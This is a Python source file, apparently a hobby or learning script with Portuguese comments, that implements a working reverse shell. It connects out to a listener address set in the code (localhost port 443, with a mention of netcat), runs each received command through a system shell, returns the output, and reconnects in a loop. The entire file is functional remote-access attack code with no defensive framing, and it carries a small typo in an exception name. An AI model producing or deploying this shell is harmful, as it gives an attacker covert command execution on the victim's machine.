import os
import socket
import subprocess
from time import sleep

IP = "127.0.0.1" # 
PORT = 443 # Ou 444, porta padrão do netcat


def connect():
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))

        return c
    except Exception as e:
        print(f'Connection error: {e}')


def listen(c):  
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == "/exit":
                return
            else:
                cmd(c, data)

    except Exception as e:
        print(f'Listen function error: {e}')


def cmd(c, data):
    try:

        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
            except Exception as e:
                print(f'CD function error: {e}')            
            
            return

        p = subprocess.Popen(
            data,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )

        output = p.stdout.read() + p.stderr.read() + b"\n"
        c.send(output)

    except Exception as e: 
        print(f'CMD function error: {e}')

if __name__ == '__main__':
    try:
        while True:
            client = connect()

            if client:
                listen(client)
            else :
                sleep(5)

    except KeybardInterrupt:
        print('Program stoped by the user')

    except Exception as e:
        print(f'Error in main function: {e}')
